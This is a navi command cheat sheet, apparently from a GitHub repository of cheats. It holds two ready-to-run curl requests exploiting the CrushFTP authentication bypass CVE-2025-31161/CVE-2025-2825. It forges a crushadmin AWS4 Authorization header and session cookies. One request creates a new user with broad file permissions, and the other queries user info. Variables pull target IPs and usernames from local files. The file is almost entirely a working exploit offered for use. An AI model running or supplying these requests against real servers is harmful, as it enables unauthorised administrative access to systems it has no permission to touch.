% sealldev, crushftp, cve
; From https://github.com/sealldeveloper/navi-cheats/

# CVE-2025-31161/CVE-2025-2825 - CrushFTP - Auth Bypass - Create a new admin user (SEND IT TWICE)
curl --path-as-is -i -s -k -X $'POST' -H $'Host: <ip>:<port>' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0' -H $'Accept: text/javascript, text/html, application/xml, text/xml, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Length: 1834' -H $'Origin: http://<ip>:<port>' -H $'Connection: keep-alive' -H $'Referer: http://<ip>:<port>/WebInterface/UserManager/index.html' -H $'Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/' -H $'Priority: u=0' -H $'Content-Type: application/x-www-form-urlencoded' -b $'currentAuth=zE1G; CrushAuth=1743755252300_3oa5v32dYiIPaoHiBqK6MnezuvzE1G' --data-binary $'command=setUserItem&data_action=new&serverGroup=MainUsers&username=<new-username>&xmlItem=user&user=%3C%3Fxml%20version%3D%271.0%27%20encoding%3D%27UTF-8%27%3F%3E%0A%3Cuser%20type%3D%27properties%27%3E%0A%3Cusername%3E<new-username>%3C%2Fusername%3E%0A%3Cpassword%3E<new-password>%3C%2Fpassword%3E%0A%3Cextra_vfs%20type%3D%27vector%27%3E%3C%2Fextra_vfs%3E%0A%3Cversion%3E1.0%3C%2Fversion%3E%0A%3CuserVersion%3E6%3C%2FuserVersion%3E%0A%3Ccreated_by_username%3Ecrushadmin%3C%2Fcreated_by_username%3E%0A%3Ccreated_by_email%3E%3C%2Fcreated_by_email%3E%0A%3Ccreated_time%3E1735128000000%3C%2Fcreated_time%3E%0A%3CfilePublicEncryptionKey%3E%3C%2FfilePublicEncryptionKey%3E%0A%3CfileDecryptionKey%3E%3C%2FfileDecryptionKey%3E%0A%3Cmax_logins%3E0%3C%2Fmax_logins%3E%0A%3Croot_dir%3EDocuments%3C%2Froot_dir%3E%0A%3Csite%3E%28SITE_PASS%29%28SITE_DOT%29%28SITE_EMAILPASSWORD%29%28CONNECT%29%3C%2Fsite%3E%0A%3Cpassword_history%3E%3C%2Fpassword_history%3E%0A%3C%2Fuser%3E&vfs_items=%3C%3Fxml%20version%3D%271.0%27%20encoding%3D%27UTF-8%27%3F%3E%0A%3Cvfs_items%20type%3D%27vector%27%3E%0A%3Cvfs_items_subitem%20type%3D%27properties%27%3E%0A%3Cname%3Etmp%3C%2Fname%3E%0A%3Cpath%3E%2F%3C%2Fpath%3E%0A%3Cvfs_item%20type%3D%27vector%27%3E%0A%3Cvfs_item_subitem%20type%3D%27properties%27%3E%0A%3Ctype%3EDIR%3C%2Ftype%3E%0A%3Curl%3EFILE%3A%2F%2F%2Fvar%2Ftmp%2F%3C%2Furl%3E%0A%3C%2Fvfs_item_subitem%3E%0A%3C%2Fvfs_item%3E%0A%3C%2Fvfs_items_subitem%3E%0A%3C%2Fvfs_items%3E&permissions=%3C%3Fxml%20version%3D%271.0%27%20encoding%3D%27UTF-8%27%3F%3E%0A%3CVFS%20type%3D%27properties%27%3E%0A%3Citem%20name%3D%27%2F%27%3E%0A%28read%29%28view%29%28resume%29%0A%3C%2Fitem%3E%0A%3Citem%20name%3D%27%2FTMP%2F%27%3E%0A%28read%29%28write%29%28view%29%28delete%29%28deletedir%29%28makedir%29%28rename%29%28resume%29%28share%29%28slideshow%29%0A%3C%2Fitem%3E%0A%3C%2FVFS%3E&c2f=zE1G' $'http://<ip>:<port>/WebInterface/function/'

# CVE-2025-31161/CVE-2025-2825 - CrushFTP - Auth Bypass - Check current user (SEND IT TWICE)
curl --path-as-is -i -s -k -X $'GET' -H $'Host: <ip>:<port>' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0' -H $'Accept: text/javascript, text/html, application/xml, text/xml, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Length: 0' -H $'Origin: http://<ip>:<port>' -H $'Connection: keep-alive' -H $'Referer: http://<ip>:<port>/WebInterface/UserManager/index.html' -H $'Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/' -H $'Priority: u=0' -b $'currentAuth=zE1G; CrushAuth=1743755252300_3oa5v32dYiIPaoHiBqK6MnezuvzE1G' $'http://<ip>:<port>/WebInterface/function/?command=getUserInfo&serverGroup=MainUsers&username=<username>&c2f=zE1G'

$ ip: if [[ -f "ips.txt" ]]; then cat ips.txt; fi
$ username: if [[ -f "users.txt" ]]; then cat users.txt; echo -e "crushadmin\n"; fi